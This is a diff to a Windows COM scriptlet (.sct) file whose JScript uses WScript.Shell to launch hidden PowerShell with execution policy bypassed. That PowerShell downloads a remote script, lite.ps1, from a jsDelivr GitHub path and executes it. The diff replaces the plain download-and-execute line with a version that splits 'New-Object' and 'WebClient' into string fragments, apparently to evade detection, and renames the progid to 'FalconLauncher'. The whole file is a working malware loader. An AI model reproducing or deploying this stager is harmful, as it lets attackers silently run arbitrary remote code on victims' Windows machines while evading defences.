@@ -1,12 +1,13 @@
 <?XML version="1.0"?>
 <scriptlet>
   <registration
-    progid="SquadFalcon"
-    classid="{F0001111-0000-0000-0000-0000F1F1F1F1F1}">
+    progid="FalconLauncher"
+    classid="{F0000000-0000-0000-0000-0000F1F1F1F1F1}">
     <script language="JScript">
       <![CDATA[
         var shell = new ActiveXObject("WScript.Shell");
-        shell.Run("powershell -w hidden -ep bypass -c IEX (New-Object Net.WebClient).DownloadString('https://cdn.jsdelivr.net/gh/RoninAli/tdata1/lite.ps1')");
+        var cmd = 'powershell -w hidden -ep bypass -c "$w=\\"Web\\"+\\"Client\\";$n=\\"New-Ob\\"+\\"ject\\";$url=\\"https://cdn.jsdelivr.net/gh/RoninAli/tdata1/lite.ps1\\";IEX (&($n) Net.$w).DownloadString($url)"';
+        shell.Run(cmd, 0, true);
       ]]>
     </script>
   </registration>
